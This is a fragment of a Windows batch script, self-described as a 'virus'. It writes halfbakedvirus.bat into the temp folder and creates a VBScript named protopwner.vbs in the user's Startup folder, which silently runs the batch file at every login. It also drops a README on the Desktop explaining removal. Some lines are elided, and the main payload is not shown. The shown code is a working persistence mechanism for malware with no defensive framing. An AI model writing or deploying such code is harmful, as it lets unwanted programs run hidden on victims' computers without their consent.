...
echo echo To disable virus, goto the startup folder and delete halfbakedvirus.bat ^> C:\Users\%username%\Desktop\README.txt >> %TEMP%\halfbakedvirus.bat
...
echo echo WshShell.Run chr(34) ^& "%TEMP%\halfbakedvirus.bat" ^& Chr(34), 0 >> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\protopwner.vbs"
echo echo Set WshShell ^= Nothing >> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\protopwner.vbs"
